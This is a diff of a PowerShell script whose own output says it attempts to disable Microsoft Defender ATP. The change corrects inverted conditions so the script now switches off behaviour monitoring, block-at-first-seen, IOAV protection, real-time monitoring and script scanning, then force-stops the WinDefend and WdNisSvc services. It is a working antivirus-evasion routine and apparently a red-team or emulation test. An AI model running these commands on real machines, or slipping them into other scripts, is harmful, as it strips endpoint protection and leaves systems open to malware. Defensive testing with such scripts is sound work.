@@ -11,27 +11,27 @@ Write-Host "Attempting to disable functionality of Microsoft Defender ATP Next G
 Write-Host "Check If Defender DisableBehaviorMonitoring is enabled and If so disable"
 $Preferences = Get-MpPreference
 $Preferences.DisableBehaviorMonitoring
-if ($Preferences.DisableBehaviorMonitoring -eq $True) {Set-MpPreference -DisableBehaviorMonitoring $False}
+if ($Preferences.DisableBehaviorMonitoring -eq $False) {Set-MpPreference -DisableBehaviorMonitoring $True}
 Get-MpPreference | fl DisableBehaviorMonitoring
 Write-Host "Check If Defender DisableBlockAtFirstSeen is enabled and If so disable"
 $Preferences = Get-MpPreference
 $Preferences.DisableBlockAtFirstSeen
-if ($Preferences.DisableBlockAtFirstSeen -eq $True) {Set-MpPreference -DisableBlockAtFirstSeen $False}
+if ($Preferences.DisableBlockAtFirstSeen -eq $False) {Set-MpPreference -DisableBlockAtFirstSeen $True}
 Get-MpPreference | fl DisableBlockAtFirstSeen
 Write-Host "Check If Defender DisableIOAVProtection is enabled and If so disable"
 $Preferences = Get-MpPreference
 $Preferences.DisableIOAVProtection
-if ($Preferences.DisableIOAVProtection -eq $True) {Set-MpPreference -DisableIOAVProtection $False}
+if ($Preferences.DisableIOAVProtection -eq $False) {Set-MpPreference -DisableIOAVProtection $True}
 Get-MpPreference | fl DisableIOAVProtection
 Write-Host "Check If Defender DisableRealtimeMonitoring is enabled and If so disable"
 $Preferences = Get-MpPreference
 $Preferences.DisableRealtimeMonitoring
-if ($Preferences.DisableRealtimeMonitoring -eq $True) {Set-MpPreference -DisableRealtimeMonitoring $False}
+if ($Preferences.DisableRealtimeMonitoring -eq $False) {Set-MpPreference -DisableRealtimeMonitoring $True}
 Get-MpPreference | fl DisableRealtimeMonitoring
 Write-Host "Check If Defender DisableScriptScanning is enabled and If so disable"
 $Preferences = Get-MpPreference
 $Preferences.DisableScriptScanning
-if ($Preferences.DisableScriptScanning -eq $True) {Set-MpPreference -DisableScriptScanning $False}
+if ($Preferences.DisableScriptScanning -eq $False) {Set-MpPreference -DisableScriptScanning $True}
 Get-MpPreference | fl DisableScriptScanning
 Stop-Service -Name WinDefend -Force -PassThru -ErrorAction Ignore
 Stop-Service -Name WdNisSvc -Force -PassThru -ErrorAction Ignore
